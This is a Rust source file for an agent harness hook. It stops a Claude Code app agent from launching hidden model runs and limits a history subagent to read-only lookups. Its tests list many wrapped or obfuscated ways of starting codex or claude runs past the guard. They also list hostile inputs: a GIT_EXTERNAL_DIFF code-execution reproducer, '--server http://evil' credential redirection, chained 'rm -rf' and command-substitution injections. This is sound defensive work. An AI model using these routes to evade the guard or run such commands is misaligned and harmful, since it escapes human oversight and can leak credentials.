//! The app agent's PreToolUse guard: delegated work must run as T3 worker
//! threads the user can see, never as model runs the agent starts itself
//! (`codex exec`, `claude -p`, subagents, workflows). The one exception is
//! the plugin's history subagent, a cheap read-only lookup of the app's
//! past: the agent may start it freely, and inside it only reading tools
//! and read-only commands run. Only the app agent's Claude instance carries
//! this hook; workers are unaffected. Its questions to the user go through
//! the tracker (`task ask`), never Claude's own question tool.

use serde_json::Value;

/// The plugin's history subagent, as Claude Code names plugin agents.
pub const HISTORY_AGENT: &str = "squircle:history";

/// Why a tool call is denied, or `None` to let it run. `cli` is how the
/// agent invokes Squircle, for the command the message points to.
pub fn check(event: &Value, cli: &str) -> Option<String> {
    let input = &event["tool_input"];
    let tool = event["tool_name"].as_str()?;
    // Claude Code marks a subagent's own tool calls with its id and type.
    if event["agent_id"].is_string() && event["agent_type"] == HISTORY_AGENT {
        return history_tool(tool, input, cli);
    }
    if tool == "AskUserQuestion" {
        return Some(format!(
            "Questions to the user go in the tracker, where they wait on the phone with everything else waiting on the user: \
             `{cli} task ask ITEM --thread <your thread id> --question \"...\" [--option \"...\"]...`, then end your turn; \
             the answer arrives as an [answer] message."
        ));
    }
    let what = match tool {
        "Agent" | "Task"
            if input["subagent_type"] == HISTORY_AGENT
                && input["model"].as_str().is_none_or(|m| m == "haiku")
                && input["isolation"].is_null() =>
        {
            return None;
        }
        "Agent" | "Task" => "Subagents",
        "Workflow" => "Workflows",
        _ => {
            let runs = runs_model(input["command"].as_str()?)?;
            return Some(format!(
                "`{runs}` runs a model outside T3, where the user can't see it. {}",
                spawn_hint(cli)
            ));
        }
    };
    Some(format!(
        "{what} run outside T3, where the user can't see them (the history subagent, `subagent_type: \"{HISTORY_AGENT}\"`, \
        is the one exception, for questions about the app's past). {}",
        spawn_hint(cli)
    ))
}

/// Inside the history subagent: Read/Grep/Glob, and Bash only as one plain
/// call of Squircle's own read-only lookups. An allowlist, not a filter of
/// shell: no assignments, expansions, redirections or chaining, and no other
/// program (git's helpers, pagers and drivers, `rg --pre`, … all run code).
fn history_tool(tool: &str, input: &Value, cli: &str) -> Option<String> {
    let deny = |what: String| {
        Some(format!(
            "The history subagent only reads: {what}. \
        Run one `{cli}` lookup per command, exactly as given, with no pipes, redirections or other programs: \
        `history search WORDS`, `history show REF` (commits too: `commit:SHA`), `notes show`, `task list|show`, \
        `thread read|status`, `build list|status|log`, `app list|show`, `agent list`. Read files with Read/Grep/Glob."
        ))
    };
    match tool {
        "Read" | "Grep" | "Glob" => None,
        "Bash" => squircle_lookup(input["command"].as_str().unwrap_or(""), cli)
            .err()
            .and_then(deny),
        other => deny(format!("{other} is not available")),
    }
}

/// `Ok` when `command` is `cli` running one read-only lookup, else why not.
fn squircle_lookup(command: &str, cli: &str) -> Result<(), String> {
    let words = plain_words(command)
        .map_err(|c| format!("`{c}` makes the shell do more than run one command"))?;
    let prefix = plain_words(cli).map_err(|_| "Squircle's path can't be checked".to_string())?;
    let shown = || {
        words
            .iter()
            .skip(prefix.len())
            .take(3)
            .cloned()
            .collect::<Vec<_>>()
            .join(" ")
    };
    let Some(rest) = words.strip_prefix(prefix.as_slice()) else {
        return Err(format!(
            "`{}` is not Squircle",
            words.first().map_or("", String::as_str)
        ));
    };
    // The service and data directory are the ones given; anything else could send its credentials elsewhere.
    if rest.iter().any(|w| {
        ["--data-dir", "--server"]
            .iter()
            .any(|o| w == o || w.starts_with(&format!("{o}=")))
    }) {
        return Err("only the given --data-dir and --server".into());
    }
    let rest: Vec<&str> = rest
        .iter()
        .map(String::as_str)
        .filter(|w| *w != "--json")
        .collect();
    let help = |w: &str| w == "--help" || w == "-h";
    let ok = match rest.as_slice() {
        [first, ..] if help(first) => true,
        [_, second] if help(second) => true,
        [group, sub, ..] => matches!(
            (*group, *sub),
            ("history", "search" | "show")
                | ("notes", "show")
                | ("task", "list" | "show")
                | ("thread", "read" | "status")
                | ("build", "list" | "status" | "log")
                | ("app", "list" | "show")
                | ("agent", "list")
        ),
        _ => false,
    };
    if ok {
        Ok(())
    } else {
        Err(format!("`{}` is not a read-only lookup", shown()))
    }
}

/// A command's words if it is one plain command: the shell passes them on
/// exactly as written, with no expansion, globbing, redirection or chaining.
/// `Err` is the first character that would make the shell do more.
fn plain_words(command: &str) -> Result<Vec<String>, char> {
    let (mut words, mut word, mut in_word) = (Vec::new(), String::new(), false);
    let mut chars = command.trim().chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            ' ' | '\t' => {
                if in_word {
                    words.push(std::mem::take(&mut word));
                    in_word = false;
                }
            }
            '\'' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(c) => word.push(c),
                        None => return Err('\''),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some(c @ ('$' | '`' | '\\' | '!')) => return Err(c),
                        Some(c) => word.push(c),
                        None => return Err('"'),
                    }
                }
            }
            // A quote inside a single-quoted path, as `agents::quote` writes it.
            '\\' if chars.peek() == Some(&'\'') => {
                chars.next();
                in_word = true;
                word.push('\'');
            }
            c if c.is_alphanumeric() || "-_./:,@+%=".contains(c) => {
                in_word = true;
                word.push(c);
            }
            // Literal mid-word (`doc:PATH#L12`); at a word's start a comment or home directory.
            '#' | '~' if in_word => word.push(c),
            c => return Err(c),
        }
    }
    if in_word {
        words.push(word);
    }
    Ok(words)
}

fn spawn_hint(cli: &str) -> String {
    format!(
        "Run every piece of delegated work, reviews and research included, as a T3 worker, one per reviewer or job: \
         `{cli} thread spawn --coordinator <your thread id> --title \"<title>\" --branch <new-branch> --prompt \"<task>\"`, \
         adding `--provider codex --model <slug> --effort <level>` for Codex (e.g. `--model gpt-6-astra --effort xhigh`) \
         or `--model`/`--effort` for Claude. Each shows up in the user's Threads, and you get a [worker update] when it finishes."
    )
}

/// The `codex` or `claude` model run in a shell command, if any.
pub fn runs_model(command: &str) -> Option<String> {
    for script in substitutions(command)
        .iter()
        .chain(std::iter::once(&command.to_string()))
    {
        for words in simple_commands(script) {
            if let Some(found) = program_run(&words, 0) {
                return Some(found);
            }
        }
    }
    None
}

/// Commands that wrap another: skip them and their options to the real program.
const WRAPPERS: &[&str] = &[
    "nohup",
    "env",
    "exec",
    "command",
    "builtin",
    "time",
    "nice",
    "timeout",
    "gtimeout",
    "caffeinate",
    "stdbuf",
    "setsid",
    "sudo",
    "xargs",
    "parallel",
    "watch",
    "unbuffer",
    "noglob",
    "npx",
    "bunx",
    "pnpx",
    "!",
    "if",
    "then",
    "else",
    "elif",
    "while",
    "until",
    "do",
];
const SHELLS: &[&str] = &["bash", "sh", "zsh", "dash", "fish", "ksh"];
// Subcommands that don't run a model; any other use runs one (or would, given a terminal).
const CODEX_SAFE: &[&str] = &[
    "--help",
    "-h",
    "help",
    "--version",
    "-V",
    "login",
    "logout",
    "completion",
    "features",
    "mcp",
];
const CLAUDE_SAFE: &[&str] = &[
    "--help",
    "-h",
    "--version",
    "-v",
    "mcp",
    "config",
    "plugin",
    "plugins",
    "doctor",
    "update",
];

fn program_run(words: &[String], depth: usize) -> Option<String> {
    if depth > 8 {
        return None;
    }
    let mut i = 0;
    // Leading assignments and redirections.
    while i < words.len() && (is_assignment(&words[i]) || is_redirect(&words[i])) {
        i += 1;
    }
    let name = program_name(words.get(i)?);
    let rest = &words[i + 1..];
    if WRAPPERS.contains(&name.as_str()) {
        let mut next = 0;
        while next < rest.len() && skippable_arg(&rest[next]) {
            next += if takes_value(&name, &rest[next]) {
                2
            } else {
                1
            };
        }
        return program_run(rest.get(next..)?, depth + 1);
    }
    if matches!(name.as_str(), "npm" | "pnpm" | "yarn" | "bun") {
        let sub = rest.iter().position(|w| !w.starts_with('-'))?;
        return if matches!(rest[sub].as_str(), "exec" | "dlx" | "x") {
            program_run(&rest[sub + 1..], depth + 1)
        } else {
            None
        };
    }
    if SHELLS.contains(&name.as_str()) {
        let flag = rest
            .iter()
            .position(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('c'))?;
        return runs_model(rest.get(flag + 1)?);
    }
    if name == "eval" {
        return runs_model(&rest.join(" "));
    }
    let safe = match name.as_str() {
        "codex" => CODEX_SAFE,
        "claude" => CLAUDE_SAFE,
        _ => return None,
    };
    match rest.first() {
        Some(first) if safe.contains(&first.as_str()) => None,
        _ => Some(
            std::iter::once(name)
                .chain(rest.iter().take(2).cloned())
                .collect::<Vec<_>>()
                .join(" "),
        ),
    }
}

/// The program a word names: its file name, with npm package names mapped to their binaries.
fn program_name(word: &str) -> String {
    let base = word.rsplit('/').next().unwrap_or(word);
    let package = word.trim_start_matches('@');
    let package = package.split('@').next().unwrap_or(package);
    match package {
        "openai/codex" => "codex".into(),
        "anthropic-ai/claude-code" => "claude".into(),
        _ => base.into(),
    }
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty()
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            && !name.starts_with(|c: char| c.is_ascii_digit())
    })
}

fn is_redirect(word: &str) -> bool {
    word.trim_start_matches(|c: char| c.is_ascii_digit())
        .starts_with(['<', '>'])
}

/// A wrapper's option whose value is the next word.
fn takes_value(wrapper: &str, flag: &str) -> bool {
    let flags: &[&str] = match wrapper {
        "env" => &["-u", "-C", "--unset", "--chdir"],
        "nice" => &["-n"],
        "timeout" | "gtimeout" => &["-s", "-k", "--signal", "--kill-after"],
        "sudo" => &["-u", "-g", "-C", "-D", "-h", "-p", "-U"],
        "xargs" => &[
            "-I", "-J", "-L", "-n", "-P", "-s", "-d", "-E", "-a", "-R", "-S",
        ],
        "parallel" => &["-j", "--jobs"],
        "caffeinate" => &["-t", "-w"],
        "watch" => &["-n", "--interval"],
        _ => &[],
    };
    flags.contains(&flag)
}

/// A wrapper's own option, option value, assignment or duration.
fn skippable_arg(word: &str) -> bool {
    word.starts_with('-')
        || is_assignment(word)
        || is_redirect(word)
        || !word.chars().any(|c| c.is_ascii_alphabetic())
        || word
            .trim_end_matches(['s', 'm', 'h', 'd'])
            .parse::<f64>()
            .is_ok()
}

/// Splits a shell script into simple commands' words, outside quotes, on
/// `;`, `&`, `|`, newlines, parentheses, braces and backticks. Comments end
/// at the line's end. Heredoc bodies read as commands, which is the safe side.
fn simple_commands(script: &str) -> Vec<Vec<String>> {
    let mut commands = Vec::new();
    let (mut words, mut word, mut in_word) = (Vec::new(), String::new(), false);
    let mut chars = script.chars().peekable();
    let end_word = |words: &mut Vec<String>, word: &mut String, in_word: &mut bool| {
        if *in_word {
            words.push(std::mem::take(word));
            *in_word = false;
        }
    };
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                for c in chars.by_ref() {
                    if c == '\'' {
                        break;
                    }
                    word.push(c);
                }
            }
            '"' => {
                in_word = true;
                while let Some(c) = chars.next() {
                    match c {
                        '"' => break,
                        '\\' => {
                            if let Some(next) = chars.next() {
                                word.push(next)
                            }
                        }
                        c => word.push(c),
                    }
                }
            }
            '\\' => {
                if let Some(next) = chars.next().filter(|c| *c != '\n') {
                    in_word = true;
                    word.push(next)
                }
            }
            '#' if !in_word => {
                for c in chars.by_ref() {
                    if c == '\n' {
                        break;
                    }
                }
                end_command(&mut commands, &mut words);
            }
            ';' | '&' | '|' | '\n' | '(' | ')' | '`' | '{' | '}' => {
                end_word(&mut words, &mut word, &mut in_word);
                end_command(&mut commands, &mut words);
            }
            '$' if chars.peek() == Some(&'(') => {
                end_word(&mut words, &mut word, &mut in_word);
                end_command(&mut commands, &mut words);
            }
            c if c.is_whitespace() => end_word(&mut words, &mut word, &mut in_word),
            c => {
                in_word = true;
                word.push(c);
            }
        }
    }
    end_word(&mut words, &mut word, &mut in_word);
    end_command(&mut commands, &mut words);
    commands
}

fn end_command(commands: &mut Vec<Vec<String>>, words: &mut Vec<String>) {
    if !words.is_empty() {
        commands.push(std::mem::take(words));
    }
}

/// Command substitutions inside double quotes, which still run.
fn substitutions(script: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut in_double = false;
    let chars: Vec<char> = script.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 1,
            '"' => in_double = !in_double,
            '\'' if !in_double => {
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    i += 1;
                }
            }
            '$' if in_double && chars.get(i + 1) == Some(&'(') => {
                let (start, mut depth) = (i + 2, 1);
                i += 2;
                while i < chars.len() && depth > 0 {
                    match chars[i] {
                        '(' => depth += 1,
                        ')' => depth -= 1,
                        _ => {}
                    }
                    i += 1;
                }
                found.push(
                    chars[start..i.saturating_sub(1).max(start)]
                        .iter()
                        .collect(),
                );
                continue;
            }
            '`' if in_double => {
                let start = i + 1;
                i += 1;
                while i < chars.len() && chars[i] != '`' {
                    i += 1;
                }
                found.push(chars[start..i.min(chars.len())].iter().collect());
            }
            _ => {}
        }
        i += 1;
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn catches_model_runs_however_they_are_written() {
        for command in [
            "codex exec 'review src/' > /tmp/astra-scan/1.md 2>&1 &",
            "mkdir -p /tmp/astra-scan && for i in 1 2 3; do nohup codex exec -m gpt-6-astra -c model_reasoning_effort=xhigh \"scan part $i\" > /tmp/astra-scan/$i.log 2>&1 & done",
            "OPENAI_LOG=1 /Users/me/.local/bin/codex exec --full-auto 'x'",
            "env -u FOO CODEX_HOME=~/.codex ~/.local/bin/codex e 'x'",
            "timeout 600 codex review",
            "nice -n 5 caffeinate -i codex -m gpt-6-astra exec 'x'",
            "codex 'just do it'",
            "cd app; codex",
            "claude -p 'review this'",
            "claude --print --model opus 'x' &",
            "echo 'review' | claude --output-format json -p",
            "seq 7 | xargs -P 7 -I {} codex exec 'part {}'",
            "bash -lc 'codex exec x'",
            "sh -c \"cd /tmp && claude -p hi\"",
            "eval \"codex exec x\"",
            "out=$(codex exec x)",
            "echo \"$(claude -p summarize)\"",
            "echo `codex exec x`",
            "npx @openai/codex@latest exec 'x'",
            "pnpm dlx @anthropic-ai/claude-code -p 'x'",
            "(codex exec a &) ; (codex exec b &)",
            "cat <<'EOF' | bash\ncodex exec x\nEOF",
            "if true; then codex exec x; fi",
            "codex \\\n  exec x",
        ] {
            assert!(runs_model(command).is_some(), "missed: {command}");
        }
    }

    #[test]
    fn leaves_ordinary_commands_alone() {
        for command in [
            "git log --oneline | grep codex",
            "echo 'codex exec is not allowed'",
            "rg -n \"claude -p\" src/",
            "ps aux | grep -i codex",
            "pkill -f 'codex exec'",
            "which codex claude",
            "ls ~/.codex # codex exec later",
            "codex --version && claude --version",
            "codex login status; claude mcp list",
            "cat /tmp/astra-scan/1.log",
            "squircle thread spawn --coordinator t --title 'Astra review' --branch r1 --prompt 'review' --provider codex --model gpt-6-astra --effort xhigh",
            "timeout 5 grep codex README.md",
            "FOO=codex make",
            "echo \"$(date) codex exec\"",
            "brew info claude",
        ] {
            assert_eq!(runs_model(command), None, "flagged: {command}");
        }
    }

    #[test]
    fn allows_only_the_history_subagent_and_only_reading_inside_it() {
        let call = |tool: &str, input: Value| json!({"hook_event_name": "PreToolUse", "agent_type": "squircle:app-agent", "tool_name": tool, "tool_input": input});
        assert_eq!(
            check(
                &call(
                    "Agent",
                    json!({"subagent_type": "squircle:history", "prompt": "why no tilt?"})
                ),
                "sq"
            ),
            None
        );
        assert_eq!(
            check(
                &call(
                    "Task",
                    json!({"subagent_type": "squircle:history", "model": "haiku", "prompt": "x"})
                ),
                "sq"
            ),
            None
        );
        for input in [
            json!({"subagent_type": "general-purpose", "prompt": "x"}),
            json!({"subagent_type": "squircle:history", "model": "opus", "prompt": "x"}),
            json!({"subagent_type": "squircle:history", "isolation": "worktree", "prompt": "x"}),
            json!({"subagent_type": "history", "prompt": "x"}),
        ] {
            assert!(
                check(&call("Agent", input.clone()), "sq").is_some(),
                "allowed {input}"
            );
        }
        // The app agent itself (`--agent`, no agent_id) keeps its usual rules.
        assert_eq!(check(&call("Edit", json!({"file_path": "/x"})), "sq"), None);

        let inside = |tool: &str, input: Value| json!({"hook_event_name": "PreToolUse", "agent_id": "a1", "agent_type": "squircle:history", "tool_name": tool, "tool_input": input});
        let cli = "'/Users/me/Remote App'\\''s/target/release/squircle' --data-dir /Users/me/.squircle --server http://127.0.0.1:8787";
        for command in [
            format!("{cli} history search simulator deck --since 14d"),
            format!("{cli} --json history show msg:assistant:4e17 --max-chars 8000"),
            format!("{cli} history show doc:docs/a.md#L12"),
            format!("{cli} history search \"why no tilt\" 'Größe' --in commits,docs"),
            format!("{cli} notes show"),
            format!("  {cli} task list --thread t"),
            format!("{cli} build log b --json"),
            format!("{cli} thread --help"),
        ] {
            assert_eq!(
                check(&inside("Bash", json!({"command": command})), cli),
                None,
                "denied: {command}"
            );
        }
        for command in [
            // The reproducer: an environment assignment makes git run any program.
            "GIT_EXTERNAL_DIFF=/tmp/h git diff --no-index a b".into(),
            "git diff --no-index a b".into(),
            "git log --oneline".into(),
            format!("SQUIRCLE_SERVER=http://evil {cli} history search x"),
            format!("env {cli} history search x"),
            format!("{cli} history search x --server http://evil"),
            format!("{cli} history search x --data-dir=/tmp/d"),
            "/tmp/squircle --data-dir /Users/me/.squircle --server http://127.0.0.1:8787 history search x".to_string(),
            format!("{cli} notes add 'x'"),
            format!("{cli} thread spawn --coordinator t --title x --branch b --prompt p"),
            format!("{cli} task update t --status done"),
            format!("{cli} history search x > /tmp/out"),
            format!("{cli} history search x 2>/dev/null"),
            format!("{cli} history search x | head"),
            format!("{cli} notes show; rm -rf y"),
            format!("{cli} notes show && touch y"),
            format!("{cli} notes show\ntouch y"),
            format!("{cli} history search \"$(touch y)\""),
            format!("{cli} history search `touch y`"),
            format!("{cli} history search $HOME"),
            format!("{cli} history search *"),
            format!("{cli} history search 'unterminated"),
            cli.to_string(),
            "cat AGENTS.md".into(),
            "rg --pre ./run x".into(),
            "codex exec 'summarize'".into(),
        ] {
            assert!(
                check(&inside("Bash", json!({"command": command})), cli).is_some(),
                "allowed: {command}"
            );
        }
        for tool in [
            "Edit",
            "Write",
            "NotebookEdit",
            "Agent",
            "Workflow",
            "Monitor",
        ] {
            assert!(
                check(&inside(tool, json!({})), "sq").is_some(),
                "allowed {tool}"
            );
        }
        assert_eq!(
            check(&inside("Read", json!({"file_path": "/x"})), "sq"),
            None
        );
    }
}
